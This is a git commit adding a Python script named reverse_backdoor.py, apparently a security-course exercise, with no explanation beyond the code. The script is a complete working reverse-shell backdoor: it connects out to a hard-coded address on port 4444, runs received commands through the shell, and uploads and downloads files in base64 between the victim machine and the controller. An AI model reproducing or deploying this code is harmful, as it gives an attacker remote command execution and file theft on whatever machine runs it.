0a5e7cce3584be1897c6c769da54e145612f006d
Mayank Pandey <mpandeymp0@gmail.com>
2024-09-30 19:43:40 +0530

    ..

---
+++ reverse_backdoor.py
@@ -0,0 +1,60 @@
+import subprocess
+import socket, json, os, base64
+
+
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+
+    def reliable_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def change_working_directory(self, path):
+        os.chdir(path)
+        return f"[+] Changing working direcotry to {path}"
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload successfull."
+
+    def run(self):
+        while True:
+            command = self.reliable_receive()
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1]).decode()
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    command_result = self.execute_system_command(command).decode()
+            except Exception:
+                command_result = "[-] Error during command execution"
+            self.reliable_send(command_result)
+
+
+my_backdoor = Backdoor("192.168.164.128", 4444)
+my_backdoor.run()
